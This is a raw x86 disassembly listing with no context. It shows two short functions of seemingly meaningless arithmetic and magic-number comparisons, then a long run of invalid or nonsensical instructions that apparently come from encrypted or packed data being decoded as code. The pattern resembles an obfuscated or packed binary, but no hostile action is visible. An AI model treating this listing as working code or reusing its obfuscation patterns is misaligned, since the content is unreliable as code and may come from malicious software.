  41d37d:	add    DWORD PTR [ebp-0x1c],edx
  41d380:	add    DWORD PTR [ebp-0x1c],ecx
  41d383:	sub    eax,ecx
  41d385:	sub    DWORD PTR [ebp-0x1c],eax
  41d388:	mov    edx,DWORD PTR ds:0x459940
  41d38e:	sub    edx,edi
  41d390:	sub    DWORD PTR [ebp-0x1c],edx
  41d393:	mov    ebx,edx
  41d395:	mov    edx,DWORD PTR [ebp-0x1c]
  41d398:	mov    DWORD PTR [ebp-0xc],eax
  41d39b:	add    DWORD PTR [ebp-0xc],edx
  41d39e:	sub    DWORD PTR [ebp-0x1c],ebx
  41d3a1:	pop    edi
  41d3a2:	cmp    edi,DWORD PTR [ebp-0x2c]
  41d3a5:	jne    0x41d3e7
  41d3a7:	cmp    edi,0xd25d
  41d3ad:	jne    0x41d3e7
  41d3af:	cmp    edi,DWORD PTR [ebp-0x8]
  41d3b2:	je     0x41d3e7
  41d3b4:	mov    edx,DWORD PTR ds:0x459940
  41d3ba:	mov    eax,0xbf8f
  41d3bf:	or     DWORD PTR [ebp-0xc],edx
  41d3c2:	sub    eax,edx
  41d3c4:	cmp    edi,DWORD PTR ds:0x459988
  41d3ca:	je     0x41d3e7
  41d3cc:	sub    eax,edi
  41d3ce:	add    eax,edi
  41d3d0:	mov    ebx,0x47
  41d3d5:	mov    esi,DWORD PTR [ebp-0xc]
  41d3d8:	sub    eax,esi
  41d3da:	sub    DWORD PTR [ebp-0x1c],ecx
  41d3dd:	or     eax,edx
  41d3df:	or     ebx,ecx
  41d3e1:	sub    DWORD PTR [ebp-0xc],eax
  41d3e4:	sub    DWORD PTR [ebp-0xc],ebx
  41d3e7:	pop    esi
  41d3e8:	mov    ecx,0xe15b
  41d3ed:	mov    edx,0xc0
  41d3f2:	add    DWORD PTR [ebp-0x1c],edx
  41d3f5:	sub    ecx,edx
  41d3f7:	add    DWORD PTR [ebp-0xc],ecx
  41d3fa:	pop    ebx
  41d3fb:	mov    ecx,0x3d
  41d400:	mov    ecx,0x982a
  41d405:	and    ecx,edi
  41d407:	add    ecx,edi
  41d409:	and    ecx,eax
  41d40b:	add    DWORD PTR [ebp-0xc],esi
  41d40e:	add    ecx,edi
  41d410:	cmp    ecx,edx
  41d412:	je     0x41d429
  41d414:	mov    edx,DWORD PTR [ebp-0x1c]
  41d417:	mov    eax,DWORD PTR [ebp-0xc]
  41d41a:	add    eax,edi
  41d41c:	or     edx,edi
  41d41e:	mov    DWORD PTR [ebp-0x34],ecx
  41d421:	add    eax,ebx
  41d423:	or     DWORD PTR [ebp-0x34],edx
  41d426:	add    DWORD PTR [ebp-0x1c],eax
  41d429:	leave  
  41d42a:	ret    
  41d42b:	int3   
  41d42c:	int3   
  41d42d:	int3   
  41d42e:	int3   
  41d42f:	int3   
  41d430:	push   ebp
  41d431:	mov    ebp,esp
  41d433:	sub    esp,0x28
  41d436:	mov    edx,0x38
  41d43b:	add    edx,edx
  41d43d:	mov    DWORD PTR [ebp-0x18],edx
  41d440:	push   ebx
  41d441:	mov    edx,0x5f
  41d446:	add    edx,edx
  41d448:	mov    ebx,DWORD PTR [ebp-0x18]
  41d44b:	add    DWORD PTR [ebp-0x18],edx
  41d44e:	add    ebx,edx
  41d450:	add    DWORD PTR [ebp-0x18],ebx
  41d453:	push   esi
  41d454:	test   ebx,0xd525
  41d45a:	jne    0x41d4f2
  41d460:	test   ebx,0x4230012
  41d466:	jne    0x41d4f2
  41d46c:	mov    ebx,DWORD PTR [ebp-0x18]
  41d46f:	or     ebx,edx
  41d471:	mov    edx,DWORD PTR [ebp-0x18]
  41d474:	add    edx,edx
  41d476:	test   ebx,0xb1
  41d47c:	je     0x41d4f2
  41d47e:	mov    eax,DWORD PTR [ebp-0x18]
  41d481:	test   ebx,0xa9
  41d487:	je     0x41d4f2
  41d489:	mov    esi,DWORD PTR [ebp-0x18]
  41d48c:	mov    ecx,0xd4
  41d491:	cmp    edx,DWORD PTR [ebp-0x18]
  41d494:	jne    0x41d4f2
  41d496:	sub    eax,ecx
  41d498:	test   edx,0x6583
  41d49e:	jne    0x41d4f2
  41d4a0:	mov    ecx,DWORD PTR [ebp-0x18]
  41d4a3:	or     DWORD PTR [ebp-0x18],eax
  41d4a6:	sub    ecx,eax
  41d4a8:	cmp    edx,0x9c72
  41d4ae:	je     0x41d4f2
  41d4b0:	add    DWORD PTR [ebp-0x18],ecx
  41d4b3:	cmp    ebx,edx
  41d4b5:	jne    0x41d4f2
  41d4b7:	cmp    ebx,DWORD PTR [ebp-0x1c]
  41d4ba:	jne    0x41d4f2
  41d4bc:	mov    eax,0x85
  41d4c1:	and    DWORD PTR [ebp-0x18],ecx
  41d4c4:	sub    DWORD PTR [ebp-0x18],eax
  41d4c7:	mov    ecx,0xcf17
  41d4cc:	or     ecx,eax
  41d4ce:	sub    DWORD PTR [ebp-0x18],ebx
  41d4d1:	cmp    edx,0x8b34
  41d4d7:	jne    0x41d4f2
  41d4d9:	mov    ecx,DWORD PTR [ebp-0x18]
  41d4dc:	mov    ebx,0x89
  41d4e1:	mov    DWORD PTR [ebp-0x18],edx
  41d4e4:	sub    esi,ebx
  41d4e6:	sub    esi,edx
  41d4e8:	sub    ecx,eax
  41d4ea:	and    esi,eax
  41d4ec:	sub    DWORD PTR [ebp-0x18],ecx
  41d4ef:	add    DWORD PTR [ebp-0x18],esi
  41d4f2:	push   edi
  41d4f3:	mov    esi,0x89
  41d4f8:	mov    edi,DWORD PTR [ebp-0x18]
  41d4fb:	or     DWORD PTR [ebp-0x18],esi
  41d4fe:	sub    edi,eax
  41d500:	sub    DWORD PTR [ebp-0x18],edi
  41d503:	mov    edi,edx
  41d505:	sub    edi,esi
  41d507:	sub    DWORD PTR [ebp-0x18],edi
  41d50a:	or     ebx,edx
  41d50c:	add    DWORD PTR [ebp-0x18],esi
  41d50f:	mov    edi,0x3802
  41d514:	mov    edx,0xdb
  41d519:	or     edx,esi
  41d51b:	add    DWORD PTR [ebp-0x18],edi
  41d51e:	add    ebx,ebx
  41d520:	sub    ebx,eax
  41d522:	and    DWORD PTR [ebp-0x18],edx
  41d525:	or     ebx,esi
  41d527:	sub    DWORD PTR [ebp-0x18],edi
  41d52a:	and    ebx,esi
  41d52c:	or     ebx,esi
  41d52e:	cmp    ebx,DWORD PTR [ebp-0x4]
  41d531:	jne    0x41d536
  41d533:	sub    DWORD PTR [ebp-0x18],ebx
  41d536:	add    edx,eax
  41d538:	or     edx,esi
  41d53a:	and    edx,eax
  41d53c:	add    edx,esi
  41d53e:	mov    esi,DWORD PTR [ebp-0x18]
  41d541:	and    edx,esi
  41d543:	sub    DWORD PTR [ebp-0x18],edx
  41d546:	mov    eax,0x3cb5
  41d54b:	sub    eax,edi
  41d54d:	mov    edi,DWORD PTR [ebp-0x18]
  41d550:	add    DWORD PTR [ebp-0x18],edx
  41d553:	add    DWORD PTR [ebp-0x18],eax
  41d556:	cmp    ebx,esi
  41d558:	jne    0x41d575
  41d55a:	add    edi,esi
  41d55c:	mov    eax,DWORD PTR [ebp-0x18]
  41d55f:	sub    DWORD PTR [ebp-0x18],edi
  41d562:	mov    edi,DWORD PTR [ebp-0x18]
  41d565:	add    eax,eax
  41d567:	sub    DWORD PTR [ebp-0x18],edi
  41d56a:	sub    DWORD PTR [ebp-0x18],edx
  41d56d:	cmp    eax,0xffffffab
  41d570:	je     0x41d575
  41d572:	add    DWORD PTR [ebp-0x18],eax
  41d575:	pop    edi
  41d576:	mov    DWORD PTR [ebp-0x18],edi
  41d579:	pop    esi
  41d57a:	and    DWORD PTR [ebp-0x18],esi
  41d57d:	pop    ebx
  41d57e:	mov    ecx,0x5b
  41d583:	mov    DWORD PTR [ebp-0x18],ecx
  41d586:	leave  
  41d587:	ret    
  41d588:	or     eax,0x8da96104
  41d58d:	xlat   BYTE PTR ds:[ebx]
  41d58e:	xor    eax,0x2daed5de
  41d593:	xchg   eax,eax
  41d595:	and    al,0x39
  41d597:	(bad)  [edx+0x78be73c7]
  41d59d:	(bad)  
  41d59f:	jo     0x41d559
  41d5a1:	sbb    DWORD PTR [ecx-0xe],edx
  41d5a4:	adc    BYTE PTR [edi],dl
  41d5a6:	xor    ch,cl
  41d5a8:	lea    esp,[eax]
  41d5aa:	jp     0x41d5de
  41d5ac:	loopne 0x41d583
  41d5ae:	mov    dl,0x10
  41d5b0:	mov    dl,0xec
  41d5b2:	or     al,BYTE PTR [edx]
  41d5b4:	imul   ecx,ebx,0x820203b
  41d5ba:	mov    bl,0x29
  41d5bc:	jp     0x41d5c6
  41d5be:	jno    0x41d5d1
  41d5c0:	pop    edx
  41d5c1:	sar    BYTE PTR [edi+0x603eb11e],cl
  41d5c7:	mov    ds:0x372fe609,al
  41d5cc:	idiv   DWORD PTR [eax-0x6d]
  41d5cf:	sbb    DWORD PTR [ebp+0x6],0x35
  41d5d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5d4:	scas   al,BYTE PTR es:[edi]
  41d5d5:	adc    edi,DWORD PTR [eax+ecx*8+0x5025db20]
  41d5dc:	mov    dl,0x40
  41d5de:	cmp    DWORD PTR [ecx+edi*4],edi
  41d5e1:	enter  0xfc38,0xf3
  41d5e5:	or     al,0x9d
  41d5e7:	inc    edx
  41d5e8:	loope  0x41d58a
  41d5ea:	(bad)  
  41d5eb:	xlat   BYTE PTR ds:[ebx]
  41d5ec:	add    DWORD PTR [ecx+0x54],ebx
  41d5ef:	cdq    
  41d5f0:	mov    dl,0x47
  41d5f2:	push   edi
  41d5f3:	mov    ds:0x28d7260e,al
  41d5f8:	or     ebp,DWORD PTR gs:[edi]
  41d5fb:	mov    WORD PTR [edx-0x267a5582],?
  41d601:	xchg   BYTE PTR [edx-0x5c506c9a],bl
  41d607:	jb     0x41d5eb
  41d609:	les    esp,FWORD PTR [eax]
  41d60b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d60c:	call   0x84d0:0xfd1ba46b
  41d613:	outs   dx,DWORD PTR ds:[esi]
  41d614:	push   eax
  41d615:	outs   dx,DWORD PTR ds:[esi]
  41d616:	or     dl,BYTE PTR [ebp-0x75fcb24e]
  41d61c:	dec    ecx
  41d61d:	retf   
  41d61e:	mov    dl,0x61
  41d620:	jl     0x41d647
  41d622:	je     0x41d61d
  41d624:	pop    esi
  41d625:	or     ebx,DWORD PTR [edx]
  41d627:	mov    ebp,0x4c57a904
  41d62c:	mov    dl,0x32
  41d62e:	ds pop ss
  41d630:	jns    0x41d5be
  41d632:	xchg   ebp,eax
  41d633:	xchg   ecx,eax
  41d634:	adc    DWORD PTR [ebx],ecx
  41d636:	or     al,0x56
  41d638:	lods   eax,DWORD PTR ds:[esi]
  41d639:	push   0x9
  41d63b:	cmp    DWORD PTR [esi],esp
  41d63d:	jno    0x41d5fd
  41d63f:	xchg   edi,eax
  41d640:	mov    WORD PTR [esi+0x5190df9a],?
  41d646:	outs   dx,DWORD PTR ds:[esi]
  41d647:	sub    BYTE PTR [ebx],dh
  41d649:	or     ecx,edx
  41d64b:	xchg   ebp,eax
  41d64c:	sbb    eax,DWORD PTR [esi]
  41d64e:	cmp    BYTE PTR [ebx-0x766196f3],0x79
  41d655:	je     0x41d6bf
  41d657:	jmp    0x41d68b
  41d659:	popf   
  41d65a:	retf   
  41d65b:	xchg   ebx,eax
  41d65c:	retf   
  41d65d:	push   ss
  41d65e:	iret   
  41d65f:	sub    BYTE PTR [esi+0xd25604b],dl
  41d665:	dec    ecx
  41d666:	ins    BYTE PTR es:[edi],dx
  41d667:	dec    ebp
  41d668:	mov    dl,0xd8
  41d66a:	out    dx,eax
  41d66b:	hlt    
  41d66c:	xchg   ebx,eax
  41d66d:	sbb    eax,0xbab732c
  41d672:	daa    
  41d673:	jno    0x41d625
  41d675:	in     eax,0x79
  41d677:	push   cs
  41d678:	in     al,dx
  41d679:	scas   al,BYTE PTR es:[edi]
  41d67a:	and    dl,ch
  41d67c:	mov    dl,0x8a
  41d67e:	mov    esp,0xbdf689d6
  41d683:	mov    edx,0x89e20bc0
  41d688:	mov    ch,0x63
  41d68a:	dec    eax
  41d68b:	inc    ebx
  41d68c:	inc    esi
  41d68d:	ins    BYTE PTR es:[edi],dx
  41d68e:	call   0xe9c1:0x31f909f
  41d695:	inc    eax
  41d696:	sub    BYTE PTR [ecx+eiz*8+0x676251b6],ah
  41d69d:	aas    
  41d69e:	add    ah,BYTE PTR [eax-0x4d]
  41d6a1:	pop    ebx
  41d6a2:	call   0x85d7:0x9dfa1d55
  41d6a9:	mov    eax,ds:0x12fca473
  41d6ae:	mov    eax,0x6215c982
  41d6b3:	mov    BYTE PTR [eax-0x68],bh
  41d6b6:	jmp    0x4231:0xdeb0b291
  41d6bd:	cmp    ebx,DWORD PTR [edx+0x7d]
  41d6c0:	std    
  41d6c1:	or     esi,DWORD PTR [ebx+0x7f]
  41d6c4:	hlt    
  41d6c5:	mov    al,BYTE PTR [ebp+eax*1-0x3564a24a]
  41d6cc:	stc    
  41d6cd:	sub    al,0xe0
  41d6cf:	out    0x1a,eax
  41d6d1:	mov    al,ds:0xe172f846
  41d6d6:	stos   BYTE PTR es:[edi],al
  41d6d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d6d8:	jno    0x41d72f
  41d6da:	dec    ebx
  41d6db:	push   es
  41d6dc:	push   cs
  41d6dd:	ja     0x41d72d
  41d6df:	mov    eax,ds:0x888ac6b2
  41d6e4:	xrelease mov DWORD PTR [eax],edx
  41d6e7:	xor    DWORD PTR [edx],ecx
  41d6e9:	or     esi,esp
  41d6eb:	sbb    eax,0xb31975d0
  41d6f0:	iret   
  41d6f1:	inc    ebx
  41d6f2:	cdq    
  41d6f3:	or     BYTE PTR [ebp+0x32],dl
  41d6f6:	push   edi
  41d6f7:	cld    
  41d6f8:	sub    bl,cl
  41d6fa:	fcomp  DWORD PTR [ebx]
  41d6fc:	mov    ds:0xd2a7f5ef,eax
  41d701:	(bad)  
  41d702:	repnz rol DWORD PTR ss:[edx+edx*4-0x358c4dab],0x30
  41d70c:	ficomp WORD PTR [edx+ebp*2]
  41d70f:	jns    0x41d6d0
  41d711:	or     ecx,DWORD PTR [ebp-0x78]
  41d714:	mov    BYTE PTR [esi],ah
  41d716:	fmul   QWORD PTR [edi+0x13]
  41d719:	dec    edi
  41d71a:	mov    esp,0x9a6a20e8
  41d71f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d720:	mov    al,ds:0x596c8dfe
  41d725:	or     esp,DWORD PTR [ebp+0x17]
  41d728:	pop    esp
  41d729:	adc    eax,0xae84cf78
  41d72e:	call   0x9f96:0x185cb637
  41d735:	(bad)  
  41d736:	out    dx,eax
  41d737:	call   0x9c72ce7b
  41d73c:	les    ecx,FWORD PTR [esi+ebx*8+0x1a19a9b0]
  41d743:	outs   dx,BYTE PTR ds:[esi]
  41d744:	stos   BYTE PTR es:[edi],al
  41d745:	loope  0x41d6db
  41d747:	mov    ah,0xe2
  41d749:	xchg   ebp,eax
  41d74a:	jl     0x41d6f3
  41d74c:	mov    ch,0xdc
  41d74e:	push   eax
  41d74f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d750:	out    0xa1,al
  41d752:	xchg   esp,eax
  41d753:	jmp    0x879168a6
  41d758:	hlt    
  41d759:	nop
  41d75a:	jne    0x41d726
  41d75c:	ror    DWORD PTR [ebx],0x87
  41d75f:	sbb    BYTE PTR [ecx+0x56],dl
  41d762:	lahf   
  41d763:	(bad)  
  41d764:	sbb    eax,0x21759a3f
  41d769:	push   ebx
  41d76a:	mov    bl,0x40
  41d76c:	sub    al,0xf7
  41d76e:	push   0x992950ef
  41d773:	sub    eax,0x360c36ef
  41d778:	jno    0x41d798
  41d77a:	pop    ss
  41d77b:	addr16 call 0xb2fd222e
  41d781:	jmp    0x9d23:0x61d594eb
  41d788:	into   
  41d789:	sub    eax,0xb5f3e74
  41d78e:	xor    esi,DWORD PTR [ebp-0x6e50f755]
  41d794:	int3   
  41d795:	iret   
  41d796:	cdq    
  41d797:	dec    edx
  41d798:	mov    cs,WORD PTR [eax-0x346d760d]
  41d79e:	pop    esp
  41d79f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d7a0:	popf   
  41d7a1:	or     eax,DWORD PTR [eax]
  41d7a3:	mul    ecx
  41d7a5:	sbb    eax,0x77097987
  41d7aa:	call   0x3767:0x4dc8ee78
  41d7b1:	imul   ecx,DWORD PTR [ecx-0x75],0x9cd84e9e
  41d7b8:	push   cs
  41d7b9:	jb     0x41d7d5
  41d7bb:	push   0xfffffff1
  41d7bd:	lds    eax,FWORD PTR [ebx]
  41d7bf:	sub    al,0x87
  41d7c1:	sbb    bl,BYTE PTR [edx+0x559f5801]
  41d7c7:	mov    WORD PTR [edi-0x245b0681],?
  41d7cd:	in     eax,dx
  41d7ce:	fcmovne st,st(2)
  41d7d0:	shl    DWORD PTR [ecx+0x731cf732],cl
  41d7d6:	cdq    
  41d7d7:	hlt    
  41d7d8:	fld    DWORD PTR [edx+0x43]
  41d7db:	adc    eax,ebx
  41d7dd:	jecxz  0x41d7e5
  41d7df:	inc    eax
  41d7e0:	fmul   QWORD PTR [ebx]
  41d7e2:	ss push ebp
  41d7e4:	push   es
  41d7e5:	jmp    0x41d791
  41d7e7:	adc    eax,0x9f9adebd
  41d7ec:	enter  0x6d41,0xff
  41d7f0:	leave  
  41d7f1:	lock sub ch,BYTE PTR [ebx+eax*2+0x6ff50057]
  41d7f9:	or     eax,DWORD PTR [ecx+edx*8-0x5d69d0b2]
  41d800:	jno    0x41d7a1
  41d802:	rcr    DWORD PTR [edi],1
  41d804:	pop    es
  41d805:	or     edx,DWORD PTR [eax-0x50]
  41d808:	mov    ebx,0xb2dd6f68
  41d80d:	lods   al,BYTE PTR ds:[esi]
  41d80e:	fsubr  QWORD PTR [eax]
  41d810:	div    DWORD PTR [eax+0xbe35524]
  41d816:	cli    
  41d817:	add    dl,ch
  41d819:	jne    0x41d855
  41d81b:	sub    al,0xa9
  41d81d:	mov    eax,fs:0x748b4c4f
  41d823:	mov    cs,WORD PTR [esi]
  41d825:	mov    ds:0x55f3abf,al
  41d82a:	xlat   BYTE PTR ds:[ebx]
  41d82b:	rcr    DWORD PTR [edx],1
  41d82d:	mov    ebp,0x99343c9a
  41d832:	lea    edx,[esp+eax*2-0x19a865be]
  41d839:	dec    eax
  41d83a:	mov    ds:0x8062037d,eax
  41d83f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d840:	jle    0x41d7f6
  41d842:	cmp    ebp,DWORD PTR [eax-0x2f02ff06]
  41d848:	mov    ch,0xa1
  41d84a:	adc    DWORD PTR [ebx-0x5b5537d6],esp
  41d850:	jmp    0x41d842
  41d852:	cmp    eax,0x13b74fa7
  41d857:	pop    ss
  41d858:	lods   eax,DWORD PTR ds:[esi]
  41d859:	scas   eax,DWORD PTR es:[edi]
  41d85a:	sub    DWORD PTR [ecx],0xffffffb2
  41d85d:	out    dx,al
  41d85e:	mov    edi,0x77caba0d
  41d863:	pusha  
  41d864:	jno    0x41d871
  41d866:	pushf  
  41d867:	mov    ebp,0x797e83b0
  41d86c:	lods   eax,DWORD PTR ds:[esi]
  41d86d:	test   DWORD PTR [edx-0x4db4abc9],ebx
  41d873:	shr    DWORD PTR [ecx+edi*1-0x55e11435],0x9a
  41d87b:	fistp  DWORD PTR [eax+0x32]
  41d87e:	xchg   esi,eax
  41d87f:	xchg   edi,eax
  41d880:	sbb    ebx,DWORD PTR ss:[ebx+0x682ab3f8]
  41d887:	xor    edi,DWORD PTR [ebx+0x74b06665]
  41d88d:	or     ebx,DWORD PTR [ebp+0x51]
  41d890:	push   cs
  41d891:	loope  0x41d89b
  41d893:	nop
  41d894:	dec    edi
  41d895:	jp     0x41d831
  41d897:	mov    edi,0x4372ed15
  41d89c:	sahf   
  41d89d:	test   al,0x2e
  41d89f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d8a0:	iret   
  41d8a1:	int    0xa9
  41d8a3:	sbb    al,0xab
  41d8a5:	aas    
  41d8a6:	mov    eax,ds:0xe345b3c4
  41d8ab:	lock sub edi,DWORD PTR [esi-0x2f9542a6]
  41d8b2:	out    dx,al
  41d8b3:	mov    al,ds:0xb99b8c7
  41d8b8:	push   ecx
  41d8b9:	add    al,0x59
  41d8bb:	(bad)  
  41d8bc:	cdq    
  41d8bd:	dec    eax
  41d8be:	sub    cl,BYTE PTR [eax+edx*1-0x12]
  41d8c2:	xchg   ebx,eax
  41d8c3:	nop
  41d8c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8c5:	(bad)  
  41d8c7:	daa    
  41d8c8:	mov    DWORD PTR [edi-0x56],ecx
  41d8cb:	push   esi
  41d8cc:	mov    dh,0xb
  41d8ce:	lods   al,BYTE PTR ds:[esi]
  41d8cf:	idiv   DWORD PTR [ebp+0x627f422]
  41d8d5:	mov    edx,0x94fd369a
  41d8da:	and    eax,0x3fdceb9c
  41d8df:	dec    edi
  41d8e0:	rol    DWORD PTR [edi-0x2f],0x54
  41d8e4:	mov    bh,0xcc
  41d8e6:	das    
  41d8e7:	sub    eax,0xd9790ba7
  41d8ec:	inc    edx
  41d8ed:	and    al,0xe3
  41d8ef:	leave  
  41d8f0:	mov    dl,0xf8
  41d8f2:	push   ecx
  41d8f3:	aas    
  41d8f4:	push   0xf243c5f3
  41d8f9:	or     ecx,DWORD PTR [edx-0x9]
  41d8fc:	(bad)  
  41d8fd:	push   0xffffffbd
  41d8ff:	xchg   BYTE PTR [ebx],bh
  41d901:	sub    BYTE PTR [edx+0x5ed71d57],bl
  41d907:	dec    esp
  41d908:	push   edx
  41d909:	pop    edi
  41d90a:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41d90c:	push   edi
  41d90d:	sbb    ch,BYTE PTR ds:0x8ffcb9cd
  41d913:	clc    
  41d914:	mov    bl,0x33
  41d916:	sub    bh,BYTE PTR [ebp+edx*1-0x4c]
  41d91a:	push   ebx
  41d91b:	pop    es
  41d91c:	jge    0x41d911
  41d91e:	mov    cl,0xd2
  41d920:	ds or  al,0x21
  41d923:	pop    esp
  41d924:	and    dh,dh
  41d926:	leave  
  41d927:	xchg   edi,eax
  41d928:	mov    ebp,0xb2b74e56
  41d92d:	push   ds
  41d92e:	shl    BYTE PTR [ebx],1
  41d930:	xchg   edi,eax
  41d931:	imul   ecx,DWORD PTR [ebx],0x52
  41d934:	pushf  
  41d935:	or     edi,ebp
  41d937:	sub    eax,0x9eb2a0c6
  41d93c:	sub    BYTE PTR [ebx-0x69697566],dh
  41d942:	sbb    BYTE PTR [eax-0x589225fc],dl
  41d948:	mov    ah,0x29
  41d94a:	mov    dh,0xf5
  41d94c:	in     eax,0x8a
  41d94e:	(bad)  
  41d94f:	mov    edx,0xb87b05b2
  41d954:	not    BYTE PTR [esi+0xb]
  41d957:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d958:	cdq    
  41d959:	or     esi,esp
  41d95b:	test   cl,ch
  41d95d:	mov    ebp,0x90c19e0d
  41d962:	mov    esp,0x9f0f98d0
  41d967:	call   0x68f9:0x685a0777
  41d96e:	stos   BYTE PTR es:[edi],al
  41d96f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d970:	out    dx,al
  41d971:	ds imul edx,edi,0x70
  41d975:	dec    esi
  41d976:	outs   dx,DWORD PTR ds:[esi]
  41d977:	repnz mov dl,0x3f
  41d97a:	test   eax,0x74f5947e
  41d97f:	test   BYTE PTR [ebx],dl
  41d981:	or     DWORD PTR [edx-0x2c],edx
  41d984:	inc    ecx
  41d985:	push   0xcbcde95a
  41d98a:	xchg   ebx,eax
  41d98c:	pusha  
  41d98d:	or     al,0x3e
  41d98f:	scas   al,BYTE PTR es:[edi]
  41d990:	pop    edx
  41d991:	sub    eax,0xc7d0c722
  41d996:	mov    ch,0xe7
  41d998:	inc    eax
  41d999:	lock call 0x8ef4a696
  41d99f:	mov    cl,BYTE PTR [ebp+esi*8-0x1d4a5bb1]
  41d9a6:	cmp    ah,BYTE PTR [edi+0x7f]
  41d9a9:	or     DWORD PTR [edx],esp
  41d9ab:	or     BYTE PTR [ebx+0x3287b0e3],al
  41d9b1:	mov    esp,0x432632f6
  41d9b6:	imul   eax,DWORD PTR [edi-0x6580a0],0x82ac86dc
  41d9c0:	sub    DWORD PTR [eax],edx
  41d9c2:	fisub  DWORD PTR [eax-0x35842772]
  41d9c8:	into   
  41d9c9:	dec    edx
  41d9ca:	gs dec ebx
  41d9cc:	sub    BYTE PTR [ebx-0x33],bh
  41d9cf:	jmp    0xadfc4386
  41d9d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d9d5:	sbb    esp,DWORD PTR [edi]
  41d9d7:	jbe    0x41d9a6
  41d9d9:	or     eax,DWORD PTR [esi-0xf]
  41d9dc:	shl    DWORD PTR [ebx+0x61289549],0x9a
  41d9e3:	pop    edx
  41d9e4:	push   eax
  41d9e5:	adc    BYTE PTR [esi],cl
  41d9e7:	sub    bl,cl
  41d9e9:	scas   eax,DWORD PTR es:[edi]
  41d9ea:	mov    ah,BYTE PTR [edi-0x4f2330c1]
  41d9f0:	push   esi
  41d9f1:	imul   esp,DWORD PTR [edi-0x7d414dc7],0x75
  41d9f8:	leave  
  41d9f9:	jne    0x41d9cc
  41d9fb:	mov    al,ds:0x29c80bac
  41da00:	mul    DWORD PTR [eax+0x1b]
  41da03:	in     eax,0x6f
  41da05:	and    al,0x9a
  41da07:	mov    esi,0x6e45ff23
  41da0c:	xchg   ebp,eax
  41da0d:	das    
  41da0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da10:	xor    BYTE PTR [ebp+0x1e],dh
  41da13:	(bad)  
  41da14:	seta   BYTE PTR [edi]
  41da17:	test   BYTE PTR [esi-0x5e9defed],dh
  41da1d:	pop    ebx
  41da1e:	sbb    ecx,eax
  41da20:	jp     0x41da1d
  41da22:	inc    edi
  41da23:	mov    dh,0x59
  41da25:	sar    DWORD PTR [esi-0x44eb72a8],cl
  41da2b:	ror    DWORD PTR [ebx+0x5c8910b],0x79
  41da32:	sbb    dl,BYTE PTR [ebx-0x4e]
  41da35:	mov    edx,0xc4a824f
  41da3a:	xor    DWORD PTR [edi],0x50c70b74
  41da40:	inc    edx
  41da41:	addr16 loope 0x41da5c
  41da44:	call   0xdd015fa8
  41da49:	or     ebp,ebx
  41da4b:	sub    cl,BYTE PTR [ecx+0x37]
  41da4e:	jp     0x41dacb
  41da50:	pop    es
  41da51:	sub    esp,ebx
  41da53:	mov    ebx,0x673d117d
  41da58:	cmp    DWORD PTR [eax-0x16522429],ecx
  41da5e:	call   0x171e:0x4e3bbaac
  41da65:	imul   ebp,DWORD PTR [edx-0x59],0xb78f1311
  41da6c:	push   esi
  41da6d:	mov    esp,0xf3b5ddec
  41da72:	(bad)  
  41da73:	out    dx,al
  41da74:	mov    ecx,0xe0c22ada
  41da79:	mov    BYTE PTR [edi+eiz*4],cl
  41da7c:	pop    ecx
  41da7d:	and    BYTE PTR [edi+0x66],ch
  41da80:	lods   al,BYTE PTR ds:[esi]
  41da81:	les    eax,FWORD PTR [edi-0xd]
  41da84:	retf   0x94a9
  41da87:	stc    
  41da88:	add    al,0x5b
  41da8a:	aam    0xa7
  41da8c:	loopne 0x41da9b
  41da8e:	jge    0x41da4e
  41da90:	loope  0x41da9d
  41da92:	aas    
  41da93:	or     DWORD PTR [ecx+0x7d],ebx
  41da96:	pop    esi
  41da97:	aam    0xe5
  41da99:	sahf   
  41da9a:	loopne 0x41db15
  41da9c:	mov    cl,0x68
  41da9e:	xor    BYTE PTR [edx-0x455a189e],dl
  41daa4:	pusha  
  41daa5:	mov    ah,0xd5
  41daa7:	cmp    bh,BYTE PTR [ebp-0x35]
  41daaa:	sahf   
  41daab:	mov    ecx,0x567cd8d2
  41dab0:	mov    dl,0x91
  41dab2:	xchg   ecx,eax
  41dab3:	repz call 0x6c60b60f
  41dab9:	or     edx,DWORD PTR ds:0x137ebb0b
  41dabf:	les    esp,FWORD PTR [edx+0x76]
  41dac2:	xchg   ebp,eax
  41dac3:	push   0x87431aff
  41dac8:	in     al,dx
  41dac9:	retf   0x1205
  41dacc:	push   ds
  41dacd:	or     edx,DWORD PTR [eax-0x2b]
  41dad0:	outs   dx,BYTE PTR ds:[esi]
  41dad1:	(bad)  
  41dad2:	popa   
  41dad3:	mov    eax,0x469a88e3
  41dad8:	push   ecx
  41dad9:	out    0xe9,eax
  41dadb:	enter  0x6f95,0x7
  41dadf:	cwde   
  41dae0:	fistp  DWORD PTR [edx+ebx*4]
  41dae3:	imul   ecx,DWORD PTR [ebx+eiz*2+0x45f338cb],0xffffff9a
  41daeb:	pop    ebp
  41daec:	shl    BYTE PTR [ecx+0x1],cl
  41daef:	in     al,0xd9
  41daf1:	sbb    al,dl
  41daf3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41daf4:	mov    al,ds:0x6e76bdbf
  41daf9:	push   esp
  41dafa:	inc    eax
  41dafb:	rcl    BYTE PTR [esp+ebx*2+0x41b26a73],cl
  41db02:	je     0x41db5b
  41db04:	(bad)  
  41db05:	xchg   ecx,eax
  41db06:	adc    esp,DWORD PTR [edi-0x74c16448]
  41db0c:	push   esi
  41db0d:	xor    edi,DWORD PTR es:[edx+esi*4+0x6ad44942]
  41db15:	shl    DWORD PTR [eax],1
  41db17:	add    al,0xbc
  41db19:	add    BYTE PTR [edi],cl
  41db1b:	pop    ebx
  41db1c:	add    DWORD PTR ds:0x2e0a011a,ebp
  41db22:	gs iret 
  41db24:	mov    cl,0xd7
